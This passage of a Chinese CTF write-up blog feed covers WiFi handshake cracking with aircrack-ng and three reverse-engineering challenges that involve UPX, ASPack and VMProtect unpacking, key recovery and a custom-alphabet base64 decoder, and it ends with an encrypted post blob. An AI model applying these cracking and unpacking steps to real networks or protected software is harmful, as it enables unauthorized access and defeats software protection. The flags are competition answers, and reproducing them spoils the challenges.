<strong>aircrack-ng -w wifipasss.txt
WiFi.pcap</strong>爆破得到<strong>flag{0566668912-f059-448f}</strong>。</p>
<h3 id="reverse">Reverse</h3>
<h4 id="shy">shy</h4>
<p><a
href="https://blog.csdn.net/KingZhang2000/article/details/100654580">CTF
逆向题 shy</a></p>
<p>首先查壳，丢到<strong>ExeinfoPE</strong>里面看一下，确定是<strong>upx</strong>壳。</p>
<p>于是丢到<strong>OD</strong>里面进行脱壳处理，由于是压缩壳，跟踪起来比较麻烦，我选择了个偷懒的办法，下一个<strong>api</strong>访问断点</p>
<p>即：<strong>VirtualProtect</strong>，运行<strong>3</strong>次<strong>F9</strong>后就跑飞了，于是在<strong>2</strong>次运行后，单步跟踪，到<strong>OEP</strong>。</p>
<p>使用<strong>OD</strong>自带的插件进行脱壳，注意基址和<strong>OEP</strong>的关系，计算好后填入。</p>
<p>然后点击脱壳，双击发现不能运行。</p>
<p>这个问题估计是重定向造成，于是修复一下重定向表的数据。</p>
<p>保存后，再次运行可以正常跑起来了。</p>
<p>再次用<strong>OD</strong>载入，发现入口地址不是<strong>OEP</strong>。</p>
<p>按说是已经解密完成了，于是我定位到<strong>OEP【0x1072940</strong>一看究竟。</p>
<p>确实已经解密，那么为了方便调试，我直接用<strong>OD</strong>改一下入口代码就可以实现了。</p>
<p>然后把修改完毕的程序，重新保存到文件，由于有重定位会有下图的提示，点击是，然后右键保存一份<strong>dump0.exe</strong>。</p>
<p><strong>OD</strong>载入<strong>dump0.exe</strong>发现修改成功，可以直接跳转到<strong>OEP</strong>行，然后单步跟踪，到输入后，发现后面的代码是个加密处理的代码，于是丢到<strong>IDA</strong>里面看一下这块对应的反编译代码。</p>
<p><strong>buf</strong>就是用户输入的字符串，**if (<em>(&amp;v4 + j) !=
v79[j])<strong>这个就是关键的比较，那么</strong>V79[]<strong>就应该是异或后的结果，也就是</strong>ben<strong>本题的密钥，于是在</strong>OD<strong>中定位值</strong>6ljh,!;:+&amp;p%i</em>a=Sc4#pt*%**。</p>
<p>接下来就简单了，直接把这个密钥输入，然后再次定位到这块就能得到<strong>flag</strong>了。</p>
<p>最终得到<strong>flag{cb7670ab-c597-4b17}</strong>。</p>
<h4 id="md5">md5</h4>
<p><a
href="https://blog.csdn.net/KingZhang2000/article/details/100625560">CTF
逆向之MD5短爆破</a>。</p>
<p>首先查壳，丢到<strong>exeinfope</strong>里面一看，发现是<strong>asp</strong>的壳，手工脱壳。</p>
<p>根据<strong>ESP</strong>定律，<strong>IAT</strong>修复和重定向表修复后，脱壳的程序可以正常运行。</p>
<p>用<strong>OD</strong>载入后，开始单步跟踪。</p>
<p>到用户输入界面，我随便输入了字符串<strong>111111111</strong>单步跟入到下图，发现了<strong>flag</strong>字样。</p>
<p>这个应该是<strong>flag</strong>的头，于是继续跟进，发现确实在核对输入数据与<strong>flag{</strong>比较，这块就过不去了。</p>
<p>于是果断的从来，输入数据为<strong>flag{111111111</strong>，来到了下图的地方，在<strong>0x16</strong>的位置比较<strong>0x7D</strong>也就是<strong>}</strong>符号。</p>
<p>由于<strong>C</strong>语言的字符串下标是从<strong>0</strong>开始的，也就是字符串第<strong>23</strong>个字符处必须是<strong>}</strong>。</p>
<p>于是构造字符串<strong>flag{11111111111111111}</strong>，继续跟进，接下来是在<strong>0x7</strong>、<strong>0xc</strong>、<strong>0x11</strong>处核对字符<strong>-</strong>即<strong>0x2D</strong>。</p>
<p>字符串就变成了<strong>flag{11-1111-1111-1111}</strong>，继续跟进，发现了一个字符串<strong>c7218260ef2b966ab0454e07c55cf4e9</strong>。</p>
<p>感觉像是<strong>MD5</strong>，于是解了一下，得到<strong>oh</strong>，结之前的<strong>flag</strong>应该就是<strong>flag{oh-1111-1111-1111}</strong>。</p>
<p>再结合本题的提示，<strong>md5</strong>段字节爆破，继续爆破得到<strong>flag{oh-aa30-1111-1111}</strong>。</p>
<p>继续输入后，单步跟进，此时发现一个字符串<strong>YTkxYQ==</strong>，看起来像<strong>base64</strong>编码，于是尝试解码，得到第三组的<strong>flag</strong>值<strong>a91a</strong>。</p>
<p>想起之前用<strong>od</strong>也看过字符串，于是找到第四组的字符串<strong>NGZicA==</strong>
，解码为<strong>4fbp</strong>。</p>
<p>最终得到<strong>flag{oh-aa30-a91a-4fbp}</strong>。</p>
<h4 id="bwarm">bwarm</h4>
<p><a
href="https://blog.csdn.net/KingZhang2000/article/details/100734483">CTF
逆向题之 Bwarm</a>。</p>
<p>首先，还是查壳，没啥说的<strong>vmp2.0.7</strong>。</p>
<p>下断点开跑，测试到第<strong>5</strong>次跑飞，那么就在第<strong>4</strong>次的时开始候单步跟踪，先跳出<strong>VirtualProtect</strong>函数
，然后对代码段设置，内存访问断点。</p>
<p>然后<strong>F9</strong>继续运行，断下来后，在<strong>ESP</strong>的地方跟踪内存数据，找到<strong>SEH</strong>结构化异常的上面<strong>35C</strong>地址那块，下一个硬件写入断点，并取消之前的内存访问断点。</p>
<p>然后继续<strong>F9</strong>运行，再次断下来，这次再在代码断下内存访问断点，然后多次<strong>F9</strong>运行，注意观察栈帧的变化，快到<strong>SEH</strong>的地方就接近<strong>OEP</strong>了，此时已经跟踪到解压后的代码段，然后进行一下代码分析。</p>
<p>完成分析后，代码就还原了，然后单步跟踪，发现<strong>OEP</strong>。</p>
<p>发现<strong>OEP</strong>后，同时我们也注意到栈帧部分被压入了<strong>3</strong>条数据，这个就是<strong>VMP</strong>偷取的代码，我们需要进行还原，于是在当前位置查找一段<strong>0000000000</strong>的内存段。</p>
<p>然后，对<strong>VMP</strong>偷取的代码进行<strong>patch</strong>。最后跳转到<strong>OEP</strong>也就是<strong>jmp
012319C9</strong>。</p>
<p>接着我们把当前的<strong>01231FB5</strong>设置为新的<strong>EIP</strong>，就可以进行<strong>dump</strong>内存操作了，填好起始地址和入口地址后，点击脱壳。</p>
<p>把脱壳的文件保存<strong>dump.exe</strong>，然后尝试运行，发现不能运行，直接崩溃掉了。</p>
<p>于是猜到可能是重定向表的问题造成，用<strong>PE</strong>编辑器修改一下，然后保存，就可以载入<strong>OD</strong>进行动态分析了。</p>
<p>单步跟踪到完成字符串输入后，发现一个<strong>base64</strong>的字符串<strong>dQkLdqXP=mLMAa8p=lnncQcq/GEPdGKXcNDl=Mnr=pcoBGPQdG1NA3Aw</strong>。</p>
<p>还有一个字典，<strong>0123456789+/=ABCDEFGHIabcdefghiJKLMNOPQRSTUVWXYZjklmnopqrstuvwxyz</strong>。</p>
<p>那么就是<strong>base64</strong>换字典。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">dic = <span class="string">&quot;0123456789+/=ABCDEFGHIabcdefghiJKLMNOPQRSTUVWXYZjklmnopqrstuvwxyz&quot;</span></span><br><span class="line">flag = <span class="string">&quot;dQkLdqXP=mLMAa8p=lnncQcq/GEPdGKXcNDl=Mnr=pcoBGPQdG1NA3Aw&quot;</span></span><br><span class="line">base64_table = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, ]</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    res += base64_table[dic.index(i)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> base64.b64decode(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;e38b5b63-4bf7-4ee8-b422-83f599fe0c43&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
        <tag>Misc</tag>
        <tag>Reserve</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 第十二届全国大学生信息安全竞赛 创新实践能力赛 线上初赛 部分题解</title>
    <url>/2019-CISCN-Preliminary/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="8d1db16070ef888c964db9ba10c5af9df7fde50ac33c8e48d1b3b8067c06589e">7e2e5d8e84a6dbe261d42399a5b5d3675b8977fce51a382885946d710f5410cc8a085444c43daf2e66b3572780d350e6ee4aeb4afc995195619f4911b2e802c97ec83cc3eb7a21e23bf75026f531767189b6a6ca793119311c226e589d704199af4984ed9f245c0608a8ebc3fa664886489ea7361096cc7590fd46ab9f6715b72e893058f60c6cde4e8cb91cfbeed2399204d0be564a4b5a502593d7abf7be0fe1985a232f379011d50e46d565c9d72ae10dda802bd64f9d0662eba132b331bca18a7376ea7439569667fc191a1d340d1732b44ead68994eab2cd8c5e2359224866912833f312505d265ce45d162e62031c9ba94c4b365c713ffe6fec6588846e63a63d0e28b563bb8d2e2cd2f37f81c1c281d5e81af5d72d4f1f67b6e4a5a7a0c25b7e63120cac2aa9cc72bca90736f3653ba1f4d8d3862ed5f689ae9de8a4fe7a053660c0c0c26dc75e3256a5221adcccc3b7b6b5f1210a2bdc1f0f91bef25c2b855f3ce8ac97ba9dcadd9d46fbe9d1c94eb1fb7f071d5110b6015c96107da038a48c79367442d64660bd46ab7809becad7181231222150955405b4d0821d18352f88c6aef4f47f5a3638c13151088228e1cbe631618fac3d609204285d49636ce8a8b6e662df864476f92b1c48ad7b9bf5f71c03b8ed733503aff6a6092004b310b5376fb62bef901e2f912538cbbccbe4eb86af262fa5f5d0f0b13cddb3550c927fbffb06ba6564079bad1632d1e5ef45f84979d717eebec25e3265d76d5c692e51993f4af467da0ec4eea2b2caff470aee30269ece9d1e6f89be80884bec32a06c67c4511d562fecde084c7113f00c1d3768af0c0ddb384cc6e8eaa3f853760a99033e4af5bd6f4657e3338c62ff387f072f2c30f74e08cd97a1ea7187ca9e29782e43a039d2d4b298dff46fc10c8c0ae9406e8339301e512ffc53254efe2332a4d9032dfcfa0eec0938208842845bf23a83eed941f7fc2402dbe718b5b8b170ff70f73cefefd4b46bd87203447835e319be52a43ad701e151500b8b0e65632cc719adf194239f90bd845428a11a171a8c04a377e4275569c475876ce5cf9319adbb0ac109d8d2da97949ebbcf34eba5444521384b28816569bdda494da404b515d31d23dd5fa30849ed03f0d0616711d7d21dda32fd2c24800182f55ea7507698b6ac02cecfff66c582ccfad48255b1066ce5128c0cde78498d68c83fcd806099f660b860d8a1a8af59592003756519055928190711944c12e37b0c25304351f4824026080ae809409616b5a4641a822ec8241de9ceae53a21e685b1a963bcfd85a3168462126aee8dee130de1e55286f28000b086ba5a7082ef1907922229a6651ba9c0b51590d787b3d78348e07866df518a6c4ac2a948f85877096490a7866d84df4aebb9414966c2374870d130493616afd9eb313127e52bfc4e20dd91a7463e9f71bfd5d287819a1979867fa451f5cac5e7a89d369d8a21e45ae7345393ea2b08dbb22d30e06ad07ec87220b4fe14e8c049268b9d4f25f4e53b806d3200f6cadf80d366299414eb7c521eb2322f058d92a02308173f9f386173a0d830ce0dd22def019ef4ec84f0c41a3cfdb118a5ed537988d9e2e5c36ce0b1e2835ca6e08055a7844c8f4bcbb20f952bade70e480ac54b85bbb8b2f995a6f9d9e27bf3478f80df6946fe9dd2e28df2a001bed753838883f7c7720c9772b52e8eaff64d23e7775c870c9a27049649106c17cc377a8e277008345ad2bd31ca104fad5dd4f2580819bb8c059f4e946851fbf548f03506f50a96f5de36adce3287ee4d4b226498e86e8fc5d2352d8e6bce4263a960dd4f7af7e981e35522ee54f0c6414c0da9b498189eaa6202bbc8f8cf3e393a433357dd8e0dce1597d1a0ab388b08b062c834bcf6acbb41004abf87b0966da93d9d34eba299ade024bcc180a75de646a7b0f591a4000a101a1556e085d891976796ea4530d9414e84da07059869f15fcad21971f8455147b6eee613779ce7873daf2cbe2dce23fc9022a954f115dba5222d47df7ed4c8709ea9bfdf9a94a70f527cd867077431a8eb8ecc0ef335d59327a02cfc8e1dede7192836315e1f2171dde282b3575ff8f96cb75a51c91285b2fcd27547cea5c97db5c286a5dc01ae72f2ac1e5b338ed85a133f7073f35d025bc0776113ecddfe19266132dc857e0dd3ccbdf6538973b7ba93596b8b26a57c3299a09163023ddbe6a7162d91f32decc66e7488d53f79c008786d29a0635f0fed1041b02dabe93c15ebe5ef357328d277e91ba38df4314a0d45eb366a38b1ebe9fd467e57aa0bf336a3fcf5dd8c2c9f9ec09add41cdc11d8d4f75a3189b3d54f2e8532e14426ff04eb0a85dc32291bb4ad8f42a4fece53ac28791ed9dfe8b6d058e52eecefe055cc96480e267abaec1166b3ee681c486cdfae6c9805232855920fb9f2ae833a553a2fb86052c608ddd5a01aec07c5a6c37e502ade56cd3e33e360b95713b8e6dc668337965100b2bc9a0e14fc128d27df77d95b0ca145befc3908282f3a48f0542388c900ea95e36570138ff1bf51d3550cb5d247e98c25a1c32edc6ca120738dc690ceaee326113432b66b4c3db42073e3fba57f4a2d88db3e0475dfce38372291e5bc65db5e80d268d1b6a9b3c5fdf8d9e76459109729f6dc90dc6e4703c9657ddcc9fbc7bcf97d38fd7fb4f3bee432c9a3a70bd58d8d3738d97c59f627b85a434c284617dcf0569e902733eca7a5b733fa4b1e3a0519fe161f1d49a586459941f75f51cbcee52691923b794dcaa0592dd70f7221e1c4f615fc75c63d11c4f6df2f2e746dd2c5cde0e88725b52bd86f2d512acac75a817cf211261f787b3926ab76e94af741d1f3fc2294ed2ea509607a79c2ae6e46d5237a0f332d743d3296fffe470776efd96337b3321160f8b07848647b65d2cb5837d479e79069b88814372ce7371a44147fa7748dc375b7f4b442420f3ee83e265e15424e2b18b2c61ae811193a01acecdad70c8665aae91f2e09b2399438d996a533d085622e0594ad410714e5e6fb2be81660081504c52ce8b5f257b943545105ae71f6e9d82a60f799cd0821becd8c5eb8bfb414ab4de91e261b1c6d346393f2ba8d79ccfd087d88fac4416c057e68ac12904111089a847ca338cce1ba2b6349b360e8ff7fec823f75fca648487b70f45b83919014659542996f7d783b4d31046905c9b53f9a23890cfb24a650a4c8937529f2b7f3ce9a75150ab85d06ff595aa7018b5359f2c0b8e2bac3482e3818faeb596a0666918451611ca3c9416bb0d2339e196f87106b91ff16dd577520ce424c6894932899b09929667b8dfe6a2999b240dd6b73e335c1bc9ad9d169a14307172c13ae227c944dfd0b30e7f96bdaa132c3571b557050f308ae28e412e62441cc0bf6d4dfac27e342aae6408a72112cc197e65dc4700041d538805407afb21f5ecda79f880967edd5a4413edc5503004e337fb2e1bbaf1d3669236ac1f56058e50e8fd800317fdeceb4ee079a300328531f2edc2f5b9906f4d5c8ef84a254c4b00aaa39c7b245561aa5a3a6f4e8eeafdcd46bb09af2dbfbf949c106e42f5673069a5aba5f7a9d5fafca7ccfba629d85cb85acdc9b2fa03b538e6867fb09622bbefd588f0c0820eb6770305b179d12d7068a05e810c9f0868e2306c2167624675ce73a1cc808cf417137e918888d7ae1cb5f2bcbf0824397709ddcfa788486c7605f1de449d04afd8795eec46ac22daf6511f19d801e44ea981a6aa110578bac56788b1a9db4b80623abc526ddfeb2d394ab1843220aa858adca7b1cc612ce719227d8cf9360bfee2e5ed9736e06f1ae299e1c3d669b63aab7c05d9d10e319f61a84c95e871a3c1d75b13de018aa22db49cea9c5715c6bf0be1ea08e082840da51d5c3bfe8d1d6529985ee28add2b432da0b8c2fe4e55c33a719106a1f594a19462cf013cc4409390f4ca4e0c9b4f99bc0725668cabeb4fd20e2fbcc1659f5eb7b043c0025a64059fad27bb8153ec56d9888c821afa8f1bcac16cff7b77037b4e981b221de2f3310bc315e6870ceb835f056d6f7a14bddf1ac6ebb5a62138c3ffa41c10384b8622bbee467282bbebce3edc5d6e3d00d62fe485a333c726284f6fc1858d43f022eaddb16a52c016c45450fde3a11dddfd0afa514940e03de4743c433534b04eeb9efce18c15f160da917a93537b8bf720af70c71dfe0f796efd9beb2be77ba25102d12a23928c790477db7c3778af84ae21c268d6e9fae223bb62643f5acf9925f3bc2e3f88316bee0eb3887f26e52069f98876bbed72ff362ba7873dea1f3aa6168e712b599cbf712e32b33c89905feedefb39507e17cba5fd352af0d93e6ff467b48d16703de849951e1e5b81fe6c96d314f341a7c230b49b948365d9f77ba964559545348b11435f76f9ab9529c9886ee0bda5fc1f77b314baf52b82aa4cb52418a189e34eec4ab9834e590ba73314ccc2b9b45516e98c040a87771ad2f1146aacc73bf7b13c576247d55506c328dee1e683b6b1b67374acbdd4d36e950b4e495905abdb8c34fe10a6c693893f2aee2e5c80cddc317326ddd73bdc94acf9b8b1b740122f9eaf267cb29ddc8593464218f6f680a7041224081bbce2a6566c3c8e3dc60dbbded0c77db5a62903ae8145085db397c8a2f22bd554684e35337be9390c493eaffdbd65fac02c7ee8fca395fdde433d4ceb8efa2586954d281048f8e74d182de32b711fbe4dbc9a2943c64a7e1bd49a2a866ed30df7f69941a23a1a381130f8066b95df4ddce575721eda4b594a31abb863c4d2e6a6fbd3fdfdda95fdb3371d1b10cea47ec429c9c766918ecca8420b44caa480ff2ecc91b05392e960ee2ec3e0aa080d30835cba6144656d701305fa5f2186fec25f515ceb978a8191a64fcbcc61eeae4b91abf3d6309c7f2885759dff23134d430282fb34b541d3894372fb4e80b2b1bfe56c44aa4dbeecbb2e8bb09f4a583635ae9f6d20d170b845278dfd55aebb9dca8e2fd51884f4e7a332a83389ef0f85caab4aee6b639b511b870feb1918ca27956100be149110d1dace775a45b6359e492272111234b838e4e5705e5398a9ca93032f35ddaf83b2512d13f17cf3f0620009e4cbd8d50b0f92e30165d0c92f35cce1c37060ba3ba9a8957584ce0b15fe1ffaa40edc3d3c7748f699d6a420358b11361ca4fcbc2547b665c051d9d30660fb3a6108a99a37aeb2a7d7491f8b9eac8af687865a4632fda6d2b641deddd8ee0eb121c037b7b5864fd6b0ddfc717a3edf40d3004fcef3c65666c7146d471f68da8f1c54075f9b32df3af43056b5e5264d0aa7f24ffe397fbf139c86cb9a659001699757bb1b8f3311485909c3698f439fdacada93f7d3b1513c8d935f5c4d62b354eb2aecfd9a2a0f3a16d728851f3f3015b29c98d361d2a4834e4d916ed7089e87c7978f3bec8fb882d9e192a1de2a8301560090055c010ef87990843bb9c63a00c2ce326679bb14a45c6110baa78b4129638a25a69b97f4b3d7c158b2b4807c6c30e14bd3a00f76ec053236689afbfde52a2f3ec02d5c04f9a27b54f23dfd9efa73d15c81636e87ef473807972d7fa2c5e408362ece0b335572b33bfbc0e107735cfc21ba29c752fb2c35559e795741cb52b29ad49ebd083a7f5a096bdba32e0327a6a92c338f6916384183a531ffa277af48b546ed389dc3e4e9606cd87c3ed5e8674747f15ba06dcabc35ffb9112210d7d323d12eb85f86f097fd0f5620bcc560f19c0645d0b0e1562d8cb48b0da05babdea371af2d4e0d27a508e9ce9899a904314c8123b3d276082720bb77d7bc220d6ef4217fde5fdd9c5ef67807396898d441f05d34b0e5ec55cebd867fdaef98cd3f16967e74bf5f462510e5b8ac56e91ba22a61ddab9ae6d4430b88dd8b19e6e0583b14603b70525a522d1ce0c21da929c3fbdf0af4598d81094643cae6df00a920e2a6abd1fa3bac2c6fd36e34316bc5523ada526d49e999af73ebfbfb92d1311fbf6997cc9a17754f567415187e268e118a40292a986b11a75aa97656fa758d99cf10e071b3ff8a5a2a86f77bb1f12022f5360f96581c296d73b31476a5dd87cb1dcff7680760ef3731622bbe3f476c5cc049cfe8ec1d0ab417243636a07ac08740c5417885a5e8818483e4fac05caa008fc7a54c0ec392d593b868838d9f0034fe425689c7864dde75a003b078827830daa67aa19623293238b9d8778eb1645a06d389253163914003281b4605c6fa4e9fd155117c3f21a0ca28f1710328481c323ddb99c9e2489b4ec956ec42cdb2d477c3243f89cf3f858e97bde024f8e50d61d4fbd64a94c2d65776d33a4e13f439483832678265c765e7d148d8454467093e7cf185523da7a47993873063d0d320989c8aeaa3c6801001876a91ce3fd16bbef86eff5dd3189f2cd9771d46362a7d845c4e5968394e00a8277d1ce1b308231fe7122c065c663500cd0d257f87b2a90769a5558ea0b551342ebad4efe94eb992c19eae716b52e714d884f5ca688635a18151cd662627936c57c4f6d14a0e8f7097f56f37646c6e210ae1e9c0831f75ae9f19a46b42da9e1d9f602ec6b0a91fd7a346a490bb8109cfd73e60d8d3f9573d35d2d8c0e1756d28e71e9b7da3fd58762df1c3123f162ab854b395a3a3ea83fd4b49dceab50af5a38907d6b78bbd9f1725350e035e3f8ed40a629cf9d4731595fd4f8f7f2e436500bddd38321e56a80e349e586f33e235e8eb43ca88330b2580d9e9c8c8fbc975a2d40cd33b2555e7764e25fd1761de7f8d29e9319803381e9532be838a434ceb97e98562d7b2fc0869a8c1c48b7b3bf5d86f746cadbc9f4e62cebe7b20e297a30f2a6909cc32da32f7b58b4bb5ff78d7a860cc4c347ec63941c3868be59e7c7b07f31addb147ecf4a36d9dae3f2ecdf650e2fc437e19e300871bda241d99ebc165996a2b929c246375451994353c828f0c9b86a8c685b3966ce3fe13b3b9d8840a65fcf861cb46b2d3183f647e38e87f7fd7cd4b5f35e5079d12fee338746293f646b5c37a9c93aa8e0bd8f4b896254923996d93af4442c539bf6c6a8eb52a9fb6e59a983b5590daf133d4a0739cf6777faca8cfd5e1f39dc7282aa9c6876d065df2300a219a30d0b8c6f75188fb352488ae077907438a979b44945b5c4fa9f723a5650910b19dab2e36d04b9b84bbd13ef871b3d086d84ead80b1978e6b03ae51340ebb46cd753a81f3c24906280db8783b0f7eb0b2bfeeb814539839f4fa659bdeaf4aab8e6c346840e5f7f3a7337b19f5b97382096aed1c014a0b0ca117cd88e4411bd9c9cbcabc4bfd6fc69c9e5827bd6d4a334be187a63871afcb102c8c7e14489fba9a1a7429b0560fd998458e4e3d7b58b236b92a0eab838557ca6d776f861f14eef4877a236dd338f8aef6df0549150aa016105842be0e296f6597a00e553325ca94df3e365d80e6a1becac1feaa02287f2302bc343cf2dbf5cb18830fb326d8d04f589274589da348b36cc1648094121049b1964f22509a104a6928724ce32bbd7599ab6b9cc110d0b672550b82e4b02954cb2bff3d33411cb61830c391da78ce499e0d09d31fb52b238594031606888fd539b211cd550e4aa8497776b7dc98fd8f1ab9f9dc7ba1f2d12def1cba3fc2054f88313efb53eb788338e86e39816eefdd90c4a95e6015211380a16745e43b6237bd9e4afabcba25b8b76d3c9aec69f2aed8b1f3bb8d9c57c3eb8a990c7662f517dd4e3fa3ee099ea1372c4d68338e611cf7627c3eab266d57ae37641aab56d1bdfd0ebe60f6e3f3276da4993ca3a5a9d8fdec85bd53eb10c96d00527d269c5d669084f876964c0f9292a0da0ec15b63ee7f49bb3044ed16908649ea397130c5391ad740e706a6cad70f649679407ee92911da0843873f12fb78aeee646395c8af10a0d9833dcd6713e5161f197dee24151ca9208e47401e2f8e668958cf1496bf70e4f603b45187a65be077e308f9d64cd6c58e5d1c480d13fbc3160fa015998bd25ba780fd65591e17961f45b219d76feea62045cd3f8f1109ad19f9f115b31fbcfaf2fa981cc305db565337201a0d8ddbf35f1fcb48be183baa70afec913fbb8743d37ca90f51bb51431763f205bbca01732183d1dc81b7776a11397393c208c7fc226c00ca5c424936b4de1afeeb68d87baf0dff69ce5fcf6e3c33d6bb8694da9badbb8273f763c724cbd3fc440e5e6b377e6d33e2a5b7ac3741df966116d43e42fefa8942c1314d730d1caf263249cf1991411d9d99054534f2b241f9bb14b37944bea9626a9dd96cae64e5fa9ffed00c7179c92c364108f8b405681e52628c02c6f5fa917645c21869d927b65a4792b804fac2ff09e4a72cdacc068dc4e59974bf50e272cd4e9b455ff32bdde5c606f621d9e28941a9d57e769771a808a6c050f483ff6fc106fe1430c115c61a5b9df5d2814811cd23b583cd626887bef4ad86b91d7e0b732a2ecbb0b4e2da8429fcdda01e69d26b2b052e4b281af3f16bc6e48e84e6e0db1a1f1807cbacfa46abef4bcc94aa8ba2f84ce65aaa25dfa690b37cd621e2fda5f82bd367c597fdd448d9abe9d708a7a8376a65133ee94a67e9864e1c645b62008ecce2a4028c3cfb94f9973b09b5af5465454e92569b578eec0a2dc707afe0d45ede26c63bc3363e563ba6cb44d80d567c709538278622c0959c365610dab8f054fcbeee335870188dbaae2d206e8eadd5642f83977da7505606bf7c1de38531ff63d9e15c6a39c0777387d1245b2517ec582c6f39774806cb2c8d3c01e50c0bf2473542eefa0d61eff1710a5928640fbcc31a6ea25ce0f333fa287a2b68c06d7fa7f16a432d0da359a95fabdc67aa116607bfb41de107ef39182cc54c0a922ea26c0b4f2a7b8a0332c74431300b782d066a55ae209a92f5c658bd212af8088697cfc5a437cffe98cb7ef2c4c55520d243581cd823ba2701727b79b95fdf3675b17fc64509f974baf76e06bdbbb8ef85cff71094ef26cbc453db99e02daa677823fefa4bc2e4deb731605d678a327b910c776748c3a4e983307e2e2b350515270411a4afa7d93c15c20f49d10a36c84e2986a44c101249839e93c0a574e6bc9a9e30ee290238ea5faa22ca8b1ab30a7cab87b7f0f1943764ad26c51ab85f603f82395d426ed0f6a830a07f7140fa920b72233aae5cf925f5611ffce85543826cb4205ad1bb48b04b16ecc88ae0d969300379f5eb4282f1031114acc35e3af3a02d81fa3805f3e1a7209d9514681a66d042d9a02471b1318be6495f94fb92529fad78378a287ceedac4c18c0846562190edbda9816467100d97745650f0cd6b50b9ab54b276e7cf5d560172917b7bf88db7b4058f261b2db8c91c56fd18c23bccb13464e7cad1613e8416979bf4981c166d306bf0c2a69cff19b4e253578fe8e571752813e8bafab888884bde92375ede89f2d5cab082f689f30a0b20c6b287ee79f514e7c77338047b9b34a4634fec2353777bd889c1d1ff28e53777bc9cec96439c2c6fa9d0edb944ad1a6441502de2d2240e3d821cd98e30549b3cfd0a989f72860597d78380686d8831bd3bb5f80a61e015dbfecf495159f01eb4bddb9e728bbaefdf7accc3b34b442b667499c58a064f7bdfbaff0e5aa5318ac24e54080aaf0dc7d306cda5f0f6b04abefb191131924e837df0d0c4c8aa62a47ab58c39105ae8684585965ed5ecdd26b42d0042361d6cace0d01993ce9655771666aa36416c6465079bed32484f01aacb91ef64056f4039ba9b25c70c6bcd6f5dbd3d2abffeabb04610392ef6c52fd0808d9f9dd9730f1eefb1ccbb0c1cb93c24d831084d12de45752638a647a61ab0fa023b4c9ebea4980a56a464affa9e9adba983402876911c079f56ca202497bb68c9eebf3f600f674f694fe88a18fbe741549bf9cc0cdc9affeda0a04b42e7d78b651821673907e9c1ff3b275a00cd996af92663ecf0e1a5612eb021b9bbcfbdb795004d68c16de23c37f1d12ca5b1a5b0cc1b62b319e8eae0a5ebca10ee114eec5f532ec732a8b0e266485be77cf778bd2052df01746b96b618666ed63272fee0030054823e7c504630cf2ef290236d2d60f4afc489e8f70acf279d29bc3c7140c3251845ab347bae2c1bc7ca731f6b53e0175a5d5cac7219a8abd86f113c06697613be4dde8fc47840cdbaf559852a318564eb097ceae54db690dc623babd984b2ba5d483455e591674fdb2648f0056ef978939bbf9f2f1e617f204fff4e70ea9cfb095fc165f4ccdc83fe428e1bc77a66619b3d85a059af370b6c953b88d00e8cd3be606e1617b1fc8bf387f690c032ac1e4f98e615f6de506456a96d650847ba161f419e2de1d6a062992963be7dbce9b5eccce7fd224d45b4242529def53d2d92403cb5a